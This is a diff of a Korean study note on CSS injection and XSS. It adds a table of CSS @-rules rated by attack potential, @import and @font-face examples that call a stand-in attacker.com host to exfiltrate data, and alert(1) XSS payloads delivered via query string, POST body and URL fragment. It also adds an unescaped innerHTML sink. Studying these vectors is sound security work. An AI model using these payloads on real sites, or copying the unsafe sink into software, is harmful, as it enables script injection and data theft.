@@ -1,4 +1,5 @@
 # 🛠 CSS Injection Payload 예제
+CSSI는 **DOM에 삽입될 때만 유효**, URL fragment나 단순 GET 파라미터만으로는 공격 불가
 
 | 번호 | 페이로드                                                                                                                                                      | 목적 / 설명                          | 사용 위치                 |
 | -- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | --------------------- |
@@ -40,6 +41,54 @@
 
 ---
 
+## ✅ CSS `@`로 시작하는 규칙
+다만 현대 브라우저는 CSP, Same-Origin Policy 등으로 제한이 많음
+
+| @ 규칙               | 용도              | CSSI 공격 가능성                                                 |
+| ------------------ | --------------- | ----------------------------------------------------------- |
+| `@import url(...)` | 외부 CSS 파일 불러오기  | ✅ 전통적인 CSSI 페이로드. 외부 서버에서 악성 CSS 불러올 수 있음                   |
+| `@font-face`       | 커스텀 폰트 불러오기     | ⚠️ 제한적. 외부 폰트에서 데이터 exfiltration 시도 가능, Modern 브라우저 CORS 필요 |
+| `@keyframes`       | CSS 애니메이션 정의    | ⚠️ 주로 시각적 공격용, exfiltration은 어렵지만 브라우저 취약점과 결합 가능           |
+| `@media`           | 미디어 쿼리 적용       | ❌ 공격 목적으로 사용 빈도 낮음, 스타일 조작용                                 |
+| `@supports`        | 특정 CSS 지원 여부 확인 | ⚠️ 브라우저 지문 수집 등에 활용 가능                                      |
+| `@namespace`       | XML 네임스페이스 지정   | ❌ 공격용으로 거의 쓰이지 않음                                           |
+
+
+#### CSSI `@` 공격에서 활용 가능한 변형
+
+1. **외부 CSS 호출**
+
+```css
+@import url("https://attacker.com/evil.css");
+```
+
+* 외부 서버로 요청 발생 → OOB exfiltration 가능
+
+2. **폰트로 데이터 exfiltration**
+
+```css
+@font-face {
+  font-family: "evil";
+  src: url("https://attacker.com/track?data=ABC");
+}
+```
+
+* 브라우저가 폰트 URL 요청 → 서버로 데이터 전송
+
+3. **애니메이션을 이용한 timing/visual exfiltration**
+
+```css
+@keyframes exfil {
+  from { color: red; }
+  to { color: green; }
+}
+div { animation: exfil 1s infinite; }
+```
+
+* CSS로 UI 상 변화 관찰 → 제한적 정보 유출 가능
+
+---
+
 ## ✅ 예시: `document.querySelector('article').innerHTML = content;` 
 
 ### 🔍 역할
@@ -77,7 +126,48 @@ let content = '<style>body { background: red; }</style>';
 let content = '<img src=x onerror=alert(1)>';
 ```
 
-→ JavaScript 실행됨 (XSS)
+→ 변수 값이 DOM에 삽입될 때 JavaScript 실행됨 (XSS)
+
+#### 공격자가 페이로드를 주입할 수 있는 경로:
+
+1. **URL 쿼리 파라미터**
+
+```url
+https://example.com/page?msg=<img src=x onerror=alert(1)>
+```
+
+* 서버가 `msg` 파라미터를 HTML에 그대로 넣으면 XSS 가능
+
+```javascript
+// 서버에서 받은 msg를 JS에서 그대로 사용
+document.getElementById('output').innerHTML = location.search.split('=')[1];
+```
+
+2. **Request Body**
+
+* POST 요청 body에서 입력을 받아 그대로 렌더링할 때도 가능
+
+```http
+POST /comment
+Content-Type: application/x-www-form-urlencoded
+
+comment=<img src=x onerror=alert(1)>
+```
+
+* 서버가 HTML escape 없이 `<article>${comment}</article>`에 넣으면 XSS 발생
+
+3. **Fragment (URL # 뒤)**
+
+```url
+https://example.com/page#<img src=x onerror=alert(1)>
+```
+
+* 단, 서버는 fragment를 받지 않음 → **JS가 fragment를 읽어 DOM에 삽입해야 XSS 가능**
 
 
+| 공격 경로        | 서버 요청 여부   | 실행 조건                         |
+| ------------ | ---------- | ----------------------------- |
+| URL query    | ✅ 서버 받음    | 서버가 escape 없이 HTML/JS에 삽입     |
+| POST body    | ✅ 서버 받음    | 서버가 escape 없이 HTML/JS에 삽입     |
+| URL fragment | ❌ 서버 받지 않음 | JS가 location.hash를 읽어 DOM에 삽입 |
 
